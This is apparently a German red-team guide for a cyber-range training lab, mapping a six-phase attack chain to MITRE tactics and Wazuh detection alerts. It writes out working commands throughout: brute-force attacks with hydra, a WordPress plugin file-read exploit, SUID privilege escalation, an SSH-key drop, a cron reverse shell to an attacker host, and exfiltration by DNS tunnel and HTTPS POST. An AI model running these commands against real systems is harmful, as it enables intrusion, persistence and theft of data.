# Cyber-Range-Lab — Attack-Chain (6 Phasen)

> **Version**: 0.1 (Pilot) · Red-Team-Perspektive

## Phasen-Uebersicht

| Phase | Dauer | Ziel(e) | Tactics (MITRE) |
|-------|-------|---------|-----------------|
| A Recon | 20 min | Alle Targets | TA0043 (Recon), TA0042 (Resource Dev) |
| B Initial Access | 60 min | Web-Target, Vault-Target | TA0001 (Initial Access) |
| C Privilege Escalation | 30 min | Web-Target → Linux-Victim | TA0004 (Privilege Escalation) |
| D Persistence | 20 min | Linux-Victim | TA0003 (Persistence), TA0006 (Credential Access) |
| E Lateral Movement | 30 min | Vault → Linux-Victim, NC-Target | TA0008 (Lateral Movement) |
| F Exfiltration | 20 min | NC-Target, Linux-Victim | TA0010 (Exfiltration) |

---

## Phase A: Recon (20 min)

### Ziele
- Netzwerk-Scan des DMZ-Subnets 10.99.10.0/28
- Service-Erkennung auf allen Targets
- Identifikation von verwundbaren Diensten

### Befehle
```bash
# Scan des gesamten DMZ-Subnets
nmap -sV -p- 10.99.10.0/28

# Gezielte Service-Erkennung
nmap -sV -p 22,80,443,3000,8080,8443 10.99.10.2-5

# Web-Enumeration
gobuster dir -u http://10.99.10.2:8080 -w /usr/share/wordlists/dirb/common.txt -t 50
gobuster dir -u http://10.99.10.5 -w /usr/share/wordlists/dirb/common.txt -t 50
```

### Triggerbare Wazuh-Alerts
- Keine (Recon laeuft meist unterhalb der Schwelle)
- Option: Portscan-Rule bei aggressivem nmap

---

## Phase B: Initial Access (60 min, 3 parallele Pfade)

### Pfad B1: WordPress-Brute-Force (Web-Target)
```bash
# WordPress-Login erkennen
curl -s http://10.99.10.2:8080/wp-login.php | grep "login"

# Brute-Force mit hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.10.2 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Einloggen:F=incorrect"
```

**Erfolgskriterium**: Login als admin auf WordPress
**Wazuh-Alert**: 100020 (HTTP-Brute-Force), 100010 (SSH-Brute wenn via ssh)

### Pfad B2: Slider-Revolution-RCE (Web-Target, CVE-2014-9734)
```bash
# Nach erfolgreichem WordPress-Login:
# Slider Revolution Plugin RCE
curl -X POST "http://10.99.10.2:8080/wp-admin/admin-ajax.php" \
  -d "action=revslider_ajax_action&client_action=update_plugin&update_plugin=../../../../wp-config.php"

# Reverse-Shell via Plugin-Upload
# Metasploit: exploit/multi/http/wp_slider_revolution_file_upload
```

**Erfolgskriterium**: Shell auf web-target
**Wazuh-Alert**: 100030 (SQLi), 100040 (LFI)

### Pfad B3: Vaultwarden-Password-Cracking (Vault-Target)
```bash
# Vaultwarden-WebUI erkennen
curl -s http://10.99.10.3:8443 | grep -i "vaultwarden\|bitwarden"

# Master-PW raten (Top-1000-Liste)
# Via docker exec auf vaultwarden-Logs:
# Oder: Brute-Force gegen die Login-API
```

**Erfolgskriterium**: Zugriff auf Vaultwarden-Admin
**Wazuh-Alert**: 100010 (SSH-Brute), 100020 (HTTP-Brute)

### Pfad B4: Nextcloud-Brute-Force (NC-Target)
```bash
# Nextcloud-Login erkennen
curl -s http://10.99.10.5 | grep -i "nextcloud\|cloud"

# Brute-Force mit hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.10.5 http-post-form \
  "/login:user=^USER^&password=^PASS^:F=Anmeldung fehlgeschlagen"

# Oder via curl direkt
for pw in $(head -100 /usr/share/wordlists/rockyou.txt); do
  curl -s -c /tmp/nc_cookie -b /tmp/nc_cookie \
    -d "user=admin&password=$pw" \
    http://10.99.10.5/login -o /dev/null -w "%{http_code}"
done
```

**Erfolgskriterium**: Login als admin (PW: 123456789)
**Trophy**: Dummy-Kundendaten (Rechnungen, Mitarbeiter, Vertraege, Phishing-Log)
**Wazuh-Alert**: 100090 (NC-Brute-Force), 100091 (NC-Exploit)

---

## Phase C: Privilege Escalation (30 min)

### Pfad C1: SUID-Binary (Linux-Victim)
```bash
# Nach SSH auf linux-victim:
find / -perm -4000 -type f 2>/dev/null

# /usr/local/bin/suid-helper ausfuehren
/usr/local/bin/suid-helper

# Hinterlegt: SUID-Bit auf /usr/bin/find -> fuehrt Kommandos als root aus
/usr/bin/find . -exec whoami \;
```

**Erfolgskriterium**: Root-Shell auf linux-victim
**Wazuh-Alert**: 100050 (SUID-Execution)

### Pfad C2: Cron-Misconfig (Linux-Victim)
```bash
# Crontab-Eintraege pruefen
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# Hinterlegt: /etc/cron.d/backup.sh laeuft als root
# Kann ueberschrieben werden fuer Persistence
```

**Erfolgskriterium**: Root-Cronjob identifiziert
**Wazuh-Alert**: 100060 (Cron-Persistence)

---

## Phase D: Persistence (20 min)

### SSH-Key-Drop
```bash
# SSH-Key auf linux-victim deployen
mkdir -p /root/.ssh
echo "ssh-ed25519 AAA... your-public-key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### Cron-Backdoor
```bash
# Reverse-Shell-Cronjob
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/10.99.30.2/4444 0>&1'" \
  > /etc/cron.d/backdoor
```

**Wazuh-Alert**: 100060 (Cron), 100061 (SSH-Key)

---

## Phase E: Lateral Movement (30 min)

### Pfad E1: Trophy-Secret aus Vault (Vault-Target -> Linux-Victim)
```bash
# Nach Vaultwarden-Compromise:
# Trophy-Secret enthaelt SSH-Key fuer linux-victim
# SSH-Key kopieren und ausfuehren
chmod 600 trophy-key
ssh -i trophy-key root@10.99.10.4
```

**Wazuh-Alert**: 100070 (Lateral-Movement-SSH)

### Pfad E2: Nextcloud-Kundendaten sichern (NC-Target)
```bash
# Nach erfolgreichem NC-Login:
# Dateien via WebDAV herunterladen
curl -u "admin:123456789" -X PROPFIND http://10.99.10.5/remote.php/dav/files/admin/

# Massen-Download der Kundendaten
curl -u "admin:123456789" http://10.99.10.5/remote.php/dav/files/admin/rechnungen.csv -o rechnungen.csv
curl -u "admin:123456789" http://10.99.10.5/remote.php/dav/files/admin/mitarbeiter.csv -o mitarbeiter.csv
curl -u "admin:123456789" http://10.99.10.5/remote.php/dav/files/admin/vertraege.csv -o vertraege.csv
curl -u "admin:123456789" http://10.99.10.5/remote.php/dav/files/admin/phishing-log.csv -o phishing-log.csv
```

**Wazuh-Alert**: 100092 (NC-Massen-Exfiltration)

---

## Phase F: Exfiltration (20 min)

### Daten via DNS-Tunnel exfiltrieren
```bash
# DNS-Tunnel vorbereiten
cat rechnungen.csv | base64 | while read line; do
  dig @8.8.8.8 "${line:0:50}.$(hostname -f).exfil.example.com" +short
done
```

### Daten via HTTPS exfiltrieren
```bash
# Auf Kali: Python-HTTPS-Server mit SSL
# Von kompromittiertem Target:
curl -X POST -d @rechnungen.csv https://10.99.30.2:443/exfil
```

**Wazuh-Alert**: 100080 (DNS-Tunneling)

---

## Zusammenfassung: Erfolgskriterien

| Phase | Minimal | Gut | Perfekt |
|-------|---------|-----|---------|
| A | 3 offene Ports identifiziert | 5+ Dienste erkannt | Alle Targets gescannt |
| B | 1 WordPress-Login | 2 Pfade erfolgreich | 4 Pfade (WP+Vault+Juice+NC) |
| C | SUID-Binary gefunden | Root auf linux-victim | Root + Cron identifiziert |
| D | SSH-Key deployed | Cron-Backdoor aktiv | Beide + getestet |
| E | 1 Lateral-Move | 2 Laterale Bewegungen | Vault + NC-Target-Daten |
| F | 1 Datei exfiltriert | 3+ Dateien | Alle Trophy-Daten |
